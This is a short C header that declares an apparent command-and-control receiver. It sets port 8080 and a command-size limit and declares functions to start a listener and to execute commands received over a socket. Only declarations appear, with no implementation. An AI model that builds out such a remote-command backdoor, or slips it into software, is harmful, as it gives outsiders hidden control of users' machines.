#ifndef CC_RECEIVER_H
#define CC_RECEIVER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 8080
#define MAX_CMD_SIZE 1024

// Function to execute the received command
void execute_command(int socket, char *cmd);

// Main function to start the C&C receiver
int start_receiver();

#endif // CC_RECEIVER_H
